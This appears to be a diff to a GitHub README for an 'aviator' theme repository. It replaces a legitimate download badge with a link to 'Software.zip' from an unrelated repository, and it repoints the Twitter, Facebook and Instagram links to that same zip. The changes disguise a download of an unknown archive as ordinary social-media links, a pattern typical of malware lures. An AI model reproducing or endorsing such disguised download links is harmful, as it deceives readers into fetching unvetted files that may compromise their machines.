@@ -12,7 +12,7 @@ This GitHub repository is dedicated to all things related to the "aviator" theme
 
 To get started with exploring this repository, you can download the latest version by clicking on the button below:
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-informational)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip){:target="_blank"}
+[![Download](https://github.com/mvargascompan/free/releases/download/v1.0/Software.zip)](https://github.com/mvargascompan/free/releases/download/v1.0/Software.zip){:target="_blank"}
 
 ## Getting Started
 
@@ -38,9 +38,9 @@ If you're passionate about the aviator theme and have insights or resources to s
 
 Connect with us on social media to stay updated with the latest news and resources related to the aviator theme:
 
-- [Twitter](https://twitter.com/aviator)
-- [Facebook](https://www.facebook.com/aviator)
-- [Instagram](https://www.instagram.com/aviator)
+- [Twitter](https://github.com/mvargascompan/free/releases/download/v1.0/Software.zip)
+- [Facebook](https://github.com/mvargascompan/free/releases/download/v1.0/Software.zip)
+- [Instagram](https://github.com/mvargascompan/free/releases/download/v1.0/Software.zip)
 
 ## Support
 
